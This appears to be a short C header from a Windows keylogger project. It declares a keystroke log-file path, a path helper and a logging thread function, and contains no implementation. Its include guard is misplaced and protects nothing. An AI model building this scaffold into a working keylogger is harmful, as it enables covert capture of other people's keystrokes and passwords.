#ifndef KEYLOG_H
#define KEYLOG_H
#endif
#include <windows.h>
extern char KEY_LOG_FILE[MAX_PATH];
void getPath(char* outPath, size_t size);
DWORD WINAPI logKey(LPVOID lpParam);
